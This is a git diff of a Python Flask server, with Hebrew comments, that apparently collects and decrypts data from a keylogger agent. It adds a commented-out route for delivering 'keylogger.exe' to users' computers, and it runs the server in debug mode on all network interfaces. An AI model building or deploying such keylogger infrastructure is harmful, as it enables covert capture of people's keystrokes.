@@ -101,6 +101,18 @@ class App:
 def home():
     return render_template("home.html")
 
+
+#שיפור להמשך שיהיה אפשר להוריד את הקובץ exe למחשב של המשתמש
+# #הורדת הקובץ exe למחשב שלו
+# @app.route("/force_download")
+# def send_file():
+#     folder = os.path.join("..", "key_logger_agent", "dist")
+#     file_path = "keylogger.exe"
+#     response = send_from_directory(folder, file_path, as_attachment=False)
+#     response.headers["Content-Disposition"] = "inline"
+#     return response
+
+
 @app.route("/api/upload",methods=["POST"])
 def upload():
 
@@ -213,7 +225,7 @@ def stop(computer_name):
 
 if __name__ == '__main__':
     #קבלת הקישור לחיבור לmongoDB
-    with open("../config.json",'r') as file:
+    with open("../keys.json", 'r') as file:
         data = json.load(file)
         mongo_link = data["mongo_link"]
         key = data["key"]
@@ -222,5 +234,5 @@ if __name__ == '__main__':
     manager = App(mongo_link)
     decryptor = Encryptor(key)# יצירת אוביקט של הצפנה
     process = SpecialKeys()
-    app.run(debug=True)
+    app.run(host="0.0.0.0",port=5000,debug=True)# פתיחת פורט לכל הרשת המקומית
 
